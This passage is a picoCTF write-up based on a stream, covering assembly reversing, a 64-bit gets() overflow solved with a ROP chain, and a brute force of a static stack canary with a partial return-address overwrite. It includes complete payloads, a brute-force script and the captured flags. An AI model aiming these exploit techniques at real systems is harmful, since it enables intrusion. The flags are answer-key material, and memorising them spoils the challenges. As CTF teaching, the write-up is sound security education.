        <+35>:  jmp    0x529 <asm1+60>
        <+37>:  cmp    DWORD PTR [ebp+0x8],0xcde
        <+44>:  jne    0x523 <asm1+54>
        <+46>:  mov    eax,DWORD PTR [ebp+0x8]
        <+49>:  sub    eax,0xb
        <+52>:  jmp    0x529 <asm1+60>
        <+54>:  mov    eax,DWORD PTR [ebp+0x8]
        <+57>:  add    eax,0xb
        <+60>:  pop    ebp
        <+61>:  ret
```

Since this is ctf challenge, Gynvael says to just run it unless you're learning asm.

Fix the jumps, get rid of the numbers, and get rid of PTR so it compiles:
```assembly
[bits 32]
asm1:

push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
```

Push the argument and a junk return address onto the stack
```assembly
[bits 32] ; 32 bit since esp instead of rsp
asm1:
push   0x529
push   0x41414141
push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
```

Add 10 to every asm+offset since the two push instruction we added are 10 bytes
```assembly
[bits 32] ; 32 bit since esp instead of rsp
asm1:
push   0x529
push   0x41414141
push   ebp
mov    ebp,esp
cmp    DWORD [ebp+0x8],0x767
jg     asm1+37+10
cmp    DWORD [ebp+0x8],0x1f3
jne    asm1+29+10
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
jmp    asm1+60+10
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60+10
cmp    DWORD [ebp+0x8],0xcde
jne    asm1+54+10
mov    eax,DWORD [ebp+0x8]
sub    eax,0xb
jmp    asm1+60+10
mov    eax,DWORD [ebp+0x8]
add    eax,0xb
pop    ebp
ret    
```

Compile and run with [asmloader (32 bit version)](https://github.com/gynvael/asmloader):
```console
$ nasm test.S
$ gdb ./asmloader
(gdb) run test
...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i r eax
eax            0x51e               1310
```
The returned value is stored in eax per [calling conventions](https://www.agner.org/optimize/calling_conventions.pdf)

## NewOverflow-2 - Binary Exploitation
We see the call to gets() in the vuln() function is the vulnerability in the program once again.  

The flag() function seems to be put in the program by mistake.
```c
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```
In a real ctf, Gynvael says to just take the easiest approach and just call this function. 
However, in the stream, Gynvael decides to call the win_fn() function since that's probably the intentional solution.
```c
void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}
```

In order to use the win_fn() function, we need to set the global `win1` and `win2` variables to true.  

We see that win1 can be set using the following function:
```c
void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}
```

and win2 can be set using this function:
```c
void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}
```

We *could* actually pass the right arguments to the above functions and then call the functions to try and set the win1 and win2 global variables, but it's much easier to just skip the if cases and jump directly to the `win1 = true;` and `win2 = true;`.  

Use the checksec tool to see what mitigations are in place in the binary:
```console
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified   Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     No       0           3            vuln
```
`NX enabled` means that we can't execute anything on the stack, but there's no PIE/ASLR (addresses that we see in memory are the addresses that are used in memory). This means ROP (Return Oriented Programming) will probably have to be used.  

Gynvael makes a ROP chain by looking at the asm. Gynvael uses IDA but you can use `objdump -d vuln` to get the asm also.  

In the win_fn1() function we have this:
```assembly
0000000000400767 <win_fn1>:
  400767: 55                    push   %rbp
  400768: 48 89 e5              mov    %rsp,%rbp
  40076b: 89 7d fc              mov    %edi,-0x4(%rbp)
  40076e: 81 7d fc ef be ad de  cmpl   $0xdeadbeef,-0x4(%rbp)
  400775: 75 07                 jne    40077e <win_fn1+0x17>
  400777: c6 05 fb 08 20 00 01  movb   $0x1,0x2008fb(%rip)        # 601079 <win1>
  40077e: 90                    nop
  40077f: 5d                    pop    %rbp
  400780: c3                    retq 
```
First we can just jump to the `movb   $0x1,0x2008fb(%rip)` which sets the win1 var to 1. This way we avoid having to set the parameters of the function.

We'll have to make the stack look like this:
```
AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
0x4141414141414141   # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
ADDR                 # This is the address of what we want to execute next. We'll figure what address we want to chain in next.
```

In the asm of win_fn2() we see this for the last 4 instruction:
```assembly
  4007b4:  c6 05 bf 08 20 00 01  movb   $0x1,0x2008bf(%rip)        # 60107a <win2>
  4007bb: 90                    nop
  4007bc: 5d                    pop    %rbp
  4007bd: c3                    retq
```

We want ADDR to be the address of the `movb   $0x1,0x2008bf(%rip)` instruction, since that sets the global win2 variable to 1. Now our exploit looks like this:
```
AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
```

After setting win2, we see a `pop %rbp`, just like the win_fn1() function. So we add some more junk data for that.
```
AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
```
Finally the `ret` in win_fn2() means we need an ADDR2 to return to:
```
AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
ADDR2                # We want to take execution to this address next
```

Now that the exploit sets win1 and win2, all we need to do is call the win_fn() function to get our flag. We find that the address of win_fn() is 0x0000000004007be.  

Make ADDR2 the address of win_fn()
```
AAAAAAAAAAAAAAAA...  # First we have some padding so we can overflow the stack. We'll figure out how much later.
0x400777             # After gets() is called and vuln() returns, execution will transfer to this address which is the address of the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
0x4007be             # Address of win_fn() which prints the flag
```

Now all we have to do with the exploit is find how much padding we need to overflow the stack and get the return address overwritten with our address. The asm for vuln() shows this:
```assembly
00000000004008b2 <vuln>:
  4008b2: 55                    push   %rbp
  4008b3: 48 89 e5              mov    %rsp,%rbp
  4008b6: 48 83 ec 40           sub    $0x40,%rsp
  4008ba: 48 8d 45 c0           lea    -0x40(%rbp),%rax
  4008be: 48 89 c7              mov    %rax,%rdi
  4008c1: b8 00 00 00 00        mov    $0x0,%eax
  4008c6: e8 65 fd ff ff        callq  400630 <gets@plt>
  4008cb: 90                    nop
  4008cc: c9                    leaveq 
  4008cd: c3                    retq 
```
The `sub    $0x40,%rsp` tells us that 0x40 bytes is allocated on the stack for buf. This means that 0x40 bytes or 64 bytes of padding is needed to overflow the buffer. We also need an additional 8 bytes for the saved rbp that we need to overwrite before reaching the return address.

We get this now:
```
64 A's               # 0x40 bytes or 64 bytes needed to overwrite the entire buffer
BBBBBBBB             # 8 bytes of junk data needed to overwrite the saved rbp
0x400777             # Address called when vuln() returns to the instruction that sets win1 to 1.
CCCCCCCC             # There's a pop %rbp after win1 is set. We need 8 bytes of junk on the stack to pop off.
0x4007b4             # This is the address of the instruction that sets win2 to 1.
CCCCCCCC             # 8 bytes of junk for the pop rbp (doesn't matter what we put here, just needs to be 8 bytes)
0x4007be             # Address of win_fn() which prints the flag
```

We just need to align all the addresses since they're 64-bit addresses:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBB
0x0000000000400777
CCCCCCCC
0x00000000004007b4
CCCCCCCC
0x00000000004007be             
```

Make the addresses little endian:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBB
\x77\x07\x40\x00\x00\x00\x00\x00
CCCCCCCC
\xb4\x07\x40\x00\x00\x00\x00\x00 
CCCCCCCC
\xbe\x07\x40\x00\x00\x00\x00\x00
```

Final Exploit (combine everything):
```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00```

Pipe our exploit into the vuln program:
```console
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
Welcome to 64-bit. Can you match these numbers?
Segmentation fault (core dumped)
```

It looks like the it didn't work. The stack is probably misaligned just like last time (NewOverflow-1). To align the stack, we can just put in the addresses to ret since ret's are the equivalent to nop (no operation) in return oriented programming.  

Find the address of a ret:
```
$ objdump -d vuln | grep retq
  4005de: c3                    retq   
  4006b0: f3 c3                 repz retq 
  4006e9: c3                    retq   
  400729: c3                    retq   
  40074a: c3                    retq   
  400750: f3 c3                 repz retq 
  400780: c3                    retq   
  4007bd: c3                    retq   
  40084c: c3                    retq   
  4008b1: c3                    retq   
  4008cd: c3                    retq   
  400936: c3                    retq   
  4009a4: c3                    retq   
  4009b0: f3 c3                 repz retq 
  4009bc: c3                    retq
```

Just use any of the above (excluding the `repz retq`). Gynvael decides to use the 0x40084c address. Put the address of the return in the exploit so that when a ret instruction is executed, the next item on the stack is the address of our ret and then it continues the chain. Here it's placed after the `BBBBBB`.:
```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00```

When we use the modified exploit, it works.
```console
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x4c\x08\x40\x00\x00\x00\x00\x00\x77\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xb4\x07\x40\x00\x00\x00\x00\x00CCCCCCCC\xbe\x07\x40\x00\x00\x00\x00\x00' | ./vuln
Welcome to 64-bit. Can you match these numbers?
picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
Segmentation fault (core dumped)
```

Some instructions need stack alignments of 16 bytes instead of 8 bytes, which is why we needed to add another 8 bytes in our exploit with the ret. 

## asm2 - Reverse Engineering
In the last asm1 challenge, Gynvael just ran the program to find the flag; this time Gynvael actually analyzes the code and converts it to python.

```assembly
asm2:
        <+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   sub    esp,0x10
        <+6>:   mov    eax,DWORD PTR [ebp+0xc]
        <+9>:   mov    DWORD PTR [ebp-0x4],eax
        <+12>:  mov    eax,DWORD PTR [ebp+0x8]
        <+15>:  mov    DWORD PTR [ebp-0x8],eax
        <+18>:  jmp    0x50c <asm2+31>
        <+20>:  add    DWORD PTR [ebp-0x4],0x1
        <+24>:  add    DWORD PTR [ebp-0x8],0xaf
        <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
        <+38>:  jle    0x501 <asm2+20>
        <+40>:  mov    eax,DWORD PTR [ebp-0x4]
        <+43>:  leave
        <+44>:  ret
```

Python translation:
```python
""" We know there are two arguments because of the problem description """
def asm2(arg1, arg2):
  """ Standard function prolouge: sets up the stack of the function """ 
  # <+0>:   push   ebp            ; This saves the old ebp from the previous function, so that when we can revert back when we return
  # <+1>:   mov    ebp,esp        ; Sets the new ebp
  # <+3>:   sub    esp,0x10       ; Creates 0x10 or 16 bytes for local variables(s) 

  """ The stack looks like this after the function prolouge:        """

                                                                    """ 
      [    A   ]                                                  
      [    B   ]                                                  
      [    C   ]                                                  
      [    D   ]                                                  
      [Old EBP ]   <-- EBP                                    
      [  RET   ]                                                  
      [  ARG1  ]                                                 
      [  ARG2  ]
                                                                    """                                                   
  """ In the above stack, each [] represents 4 bytes. A, B, C, and D all represent local 4 byte variables since we know that that a total of 16 bytes were located for local variables. Right now we don't know how many actual variables there are, but we're just assuming there's four 4 byte vars right now. It could be sixteen 1 byte variables, but we don't know yet."""


  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
  eax = arg2

  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
  d = eax

  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
  eax = arg1

  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
  c = eax

  # <+18>:  jmp    0x50c <asm2+31>


  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
  d +=1
  c += 0xaf

  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
  # <+38>:  jle    0x501 <asm2+20>
  if c <= 0xa3d3:
    goto asm2+20

  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
  # <+43>:  leave
  # <+44>:  ret
  return d

```

There are no gotos in python, so turn the goto into a while loop and simplify a bit:
```python
def asm2(arg1, arg2):
  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
  d = arg2

  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
  c = arg1

  # <+18>:  jmp    0x50c <asm2+31>
  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
  # <+38>:  jle    0x501 <asm2+20>
  while c <= 0xa3d3:
    d+=1
    c+= 0xaf

  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
  # <+43>:  leave
  # <+44>:  ret
  return d

```

If we want to be even more accurate, we would account for the fact that x86 asm operates on 32 bit integers while python doesn't really have a limit on the size of integers. So we can truncate python's integers to 32 bits. We don't have to do this for this challenge since it probably won't matter.
```python
def asm2(arg1, arg2):
  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
  d = arg2

  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
  c = arg1

  # <+18>:  jmp    0x50c <asm2+31>
  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
  # <+38>:  jle    0x501 <asm2+20>
  while c <= 0xa3d3:
    d = (d + 1) & 0xffffffff # Apply a mask to truncate to 32 bits
    c = (c + 0xaf) & 0xffffffff # Apply a mask to truncate to 32 bits

  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
  # <+43>:  leave
  # <+44>:  ret
  return d
```

Now run the function with the provided arguments:
```python
def asm2(arg1, arg2):
  # <+6>:   mov    eax,DWORD PTR [ebp+0xc]  ; 0xc is 12. So ebp + 12 points to arg2 if you use the diagram above to count
  # <+9>:   mov    DWORD PTR [ebp-0x4],eax  ; ebp - 4 is the local variable D
  d = arg2

  # <+12>:  mov    eax,DWORD PTR [ebp+0x8]
  # <+15>:  mov    DWORD PTR [ebp-0x8],eax
  c = arg1

  # <+18>:  jmp    0x50c <asm2+31>
  # <+20>:  add    DWORD PTR [ebp-0x4],0x1
  # <+24>:  add    DWORD PTR [ebp-0x8],0xaf
  # <+31>:  cmp    DWORD PTR [ebp-0x8],0xa3d3
  # <+38>:  jle    0x501 <asm2+20>
  while c <= 0xa3d3:
    d = (d + 1) & 0xffffffff # Apply a mask to truncate to 32 bits
    c = (c + 0xaf) & 0xffffffff # Apply a mask to truncate to 32 bits

  # <+40>:  mov    eax,DWORD PTR [ebp-0x4] ; eax is where the return value is usually in x86
  # <+43>:  leave
  # <+44>:  ret
  return d

print(hex(asm2(0xc,0x15)))
```

```console
$ python test.py
0x105
```

This approach of translating into a higher level language is a standard way of reverse engineering.

## CanaRy - Binary Exploitation
A canary is just a random value on the stack in between the local variables and the return address. Thus if an attacker overwrites it by trying to overwrite the return address, the attacker will change the value of the canary and the program will exit immediately.  

Reconissance:
```console
$ file vuln
vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6cfe75e5f3db954bad5a09eb57527c5a0d727b8f, not stripped
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
```
No canary means that the program has a custom canary implementation. The program also has ASLR/PIE and NX enabled (non executable stack).

Like every other binary challenge, code to make exploitation easier (no buffering stdout and makes sure priveleges aren't dropped)
```c
setvbuf(stdout, NULL, _IONBF, 0);

int i;
gid_t gid = getegid();
setresgid(gid, gid, gid);
```

The read_canary() function:
```c
void read_canary() {
  FILE *f = fopen("/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}
```
Canary is read from a file called canary.txt and puts the canary in a global variable called key.

```c
#define KEY_LEN 4
...
char key[KEY_LEN];
```
We see that the key canary is only 4 bytes.

There's a constant canary since the canary is read from a file which allows the canary to be bruteforced. Usually this isn't found in the wild except in fork servers where all the children processes have the same canary or in Windows XP's kernel.  

Let's look at the vuln() function:
```c
...
char canary[KEY_LEN];
char buf[BUF_SIZE];
char user_len[BUF_SIZE];
...
```
This order of declaration means the stack looks like this:
```
[RETURN ADDRESSS]
[ Old Saved EBP ]
[ Canary Buffer ]
[   Buf buffer  ]
[user_len buffer]
```

```c
...
memcpy(canary,key,KEY_LEN);
...
```
This copies the canary from `key` to `canary`. This is also usually how it work. The cananry is copied from a "master cookie" (stored in a hidden location) at the beginning of the function.  

The following just reads a length from the user:
```c
while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
}
sscanf(user_len,"%d",&count);
```

This reads user input, but it trusts the length we give. Since we control `count`, we can cause a buffer overflow.
```c
read(0,buf,count);
```

This just checks if the canary was overwritten:
```c
if (memcmp(canary,key,KEY_LEN)) {
  printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
  exit(-1);
}
```

We want to jump to the flag after bypassing the canary:
```c
void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}
```

The way we attack the canary is brute force the canary one byte at a time. Instead of brute forcing 4 bytes or around 4 billion combinations (2^32), bruteforcing one byte at a time only has 256 (2^8) combinations per byte. We can just overwrite one byte of the canary at a time, and it we guess that byte correctly, we won't see the ```*** Stack Smashing Detected ***``` message. When we guess the first byte correctly, we can then use that first byte and then guess the second byte. Then when we guess the second byte correctly, we can guess the third and so on. Once we get the canary, we can overwrite the buffer, overwrite the canary with the right canary, overwrite some stuff in between the canary and return address, and then overwrite the return address with the address of display_flag().

Gynvael uses IDA to make sure the buffer is right next to the canary in memory.

Script to find canary:
```python
import subprocess

def call(sz, t):
  assert sz>=32
  payload = ""
  payload += "%i\n" % sz # size of our input
  payload += "A" * 32 # To fill the buf buffer
  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'

  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
  (stdout, stderror) = p.communicate(payload)

  print stdout

canary = [0, 0, 0, 0]

call(33, canary) # Test the call function
```

Test the script locally:
```console
$ python go.py
[ERROR]: Trying to Read Canary
```

The above error occurs because the binary is trying to open up the canary.txt file. Let's create it:
```console
$ echo -n ASDF > canary.txt
```

The error still occurs:
```console
$ python go.py
[ERROR]: Trying to Read Canary
```
This is because the vuln binary has the path to canary.txt hard coded.

Use a hex editor to change the hardcoded path (looks like `/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt`) to something like `canary.txt`. After patching the binary, the program will look for the canary.txt in the current directory.

Now the script works:
```console
$ python go.py
Please enter the length of the entry:
> Input> *** Stack Smashing Detected *** : Canary Value Corrupt!
```

Now we have to use our script call() function to brute force the stack value.
```python
import subprocess

def call(sz, t):
  assert sz>=32
  payload = ""
  payload += "%i\n" % sz # size of our input
  payload += "A" * 32 # To fill the buf buffer
  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'

  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
  (stdout, stderror) = p.communicate(payload)

  #print stdout
  return "Stack Smashing Detected" not in stdout

canary = [0, 0, 0, 0]

for i in xrange(4):
  for j in xrange(256):
    canary[i] = j
    if call(33 + i, canary):
      print "%i" % j
      break

#call(33, canary) # Test the call function
```

The script works locally:
```console
$ python go.py
65
83
68
70
```

Testing on remote (make sure to change the path in the script):
```console
$ python ~/go.py
51
51
120
79
```

The four bytes of the canary on the remote are 51, 51, 120, 79.  

With the canary value now figured out, we can now make the payload. We have to deal with ASLR. ASLR moves around memory pages, but not the contents. This means the lowest 3 nibbles (lowest 3 hex digits) of the addresses stays constant. 

If we look at the address of display_flag() it says 0x000007ed (using IDA, Ghidra, or objdump). This means that the last few digits `7ed` will reman constant while the rest will change because of ASLR.

```python
import subprocess

def call(sz, t, stuff=""):
  assert sz>=32
  payload = ""
  payload += "%i\n" % sz # size of our input
  payload += "A" * 32 # To fill the buf buffer
  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + stuff + '\n'

  p = subprocess.Popen(["/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
  (stdout, stderror) = p.communicate(payload)

  print stdout
  return "Stack Smashing Detected" not in stdout

canary = [51, 51, 120, 79] # Replace with the stack canary we got from the remote server
payload = "A"*0x10 # Gynvael used IDA to see how many bytes were inbetween the canary and return address. It seems to be 0x10 or 16 bytes
payload += chr(0xED) + chr(0x07) # We know that the last 3 nibbles of display_flag() are 0x7ed, so we know the last byte will be 0xED. We don't actually know that the penultimate byte is 0x07, we only know the '7' part, but if we run the script multiple times, eventually the address will hit a zero at that position. The higher bytes of display_flag() address will be the same as the address from main(). So we only need to overwrite the last two bytes of the return address.


# Just execute the vuln program multiple times so that eventually we get the address of display_flag() right
for i in xrange(32):
  call(32 + 4 + 0x10 + 2, canary, payload) # 32 bytes for buffer + 4 bytes for canary + 0x10 bytes of stuff we don't care about + 2 bytes of the return address to overwrite

```

Now run the above script on the remote server
```console
user@pico-2019-shell1:/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0$ python ~/asdf.py
Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?

Please enter the length of the entry:
> Input> Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
```

## Investigative Reversing 0 - Forensics
We get a png and a binary. When we look at the png in a hex editor it looks like there's a flag at the end of it, although it's modified. Gynvael looks at the binary in IDA and sees that the binary appends the first 6 bytes of the flag to the png, appends the 9 next bytes after adding 5 to each of the chars, and then subtracts 3 to the next byte. Gynvael does the opposite operations on the hex to reverse what the binary did to get the flag.

## asm3 - Reverse Engineering
Here's the asm:
```assmebly
asm3:
        <+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   xor    eax,eax
        <+5>:   mov    ah,BYTE PTR [ebp+0x9]
        <+8>:   shl    ax,0x10
        <+12>:  sub    al,BYTE PTR [ebp+0xd]
        <+15>:  add    ah,BYTE PTR [ebp+0xf]
        <+18>:  xor    ax,WORD PTR [ebp+0x10]
        <+22>:  nop
        <+23>:  pop    ebp
        <+24>:  ret
```
Standard ebp+offset references arguments.

Convert to python:
```python
from struct import pack, unpack # For converting stuff to little endian

""" Just converts to little endian"""
def dd(v):
  return pack("<I", v)

""" Read word: Returns unsigned integer 16 bits from little endian"""
def rw(d):
  return unpack("<H", d)[0]

# set up the stack before the asm3 function is called
stack = bytearray(dd(0) + dd(0) + dd(0xc264bd5c) + dd(0xb5a06caa) + dd(0xad761175)) # dd(0) are there for saved ebp and return address

# eax is split into different parts
# [    eax    ] ; 4 bytes
# [   ] [ ax  ] ; ax is 2 bytes
# [  ] [ah][al] ; ah and al are both only 1 byte

# <+5>:   mov    ah,BYTE PTR [ebp+0x9]
ax = stack[9] << 8 # grab byte at index 9 and shift left by a byte since ah is the second lowest byte

# <+8>:   shl    ax,0x10
ax = ((ax & 0xffff) << 0x10) & 0xffff # First grab only 2 bytes from ax and shift left by 0x10 and then only grab 2 bytes of the result

# <+12>:  sub    al,BYTE PTR [ebp+0xd]
al = ((ax & 0xff) - stack[0xd]) & 0Xff # Grab bottom byte of ax and subtract the byte at index 0xd. then grab only bottom byte of that
ax = (ax & 0xff00) | al # Zero out bottom bytes of ax and then fill bottom byte of ax with al, leaving top byte of ax unchanged

# <+15>:  add    ah,BYTE PTR [ebp+0xf]
ah = (((ax >> 8) & 0xff) + stack[0xf]) & 0xff # Take top byte from ax and add byte at index 0xf. Then get only lowest byte from it since ah is only 16 bits
ax = (ax & 0x00ff) | (ah << 8) # Transfer ah to ax by zeroing out top byte of ax and leaving bottom byte of ax unmodified 

# <+18>:  xor    ax,WORD PTR [ebp+0x10]
ax ^= rw(stack[0x10:0x12])

print("0x%.4x" % ax)
```
## miniRSA - Cryptography
This is what we get:
```
N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c): 2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125
```
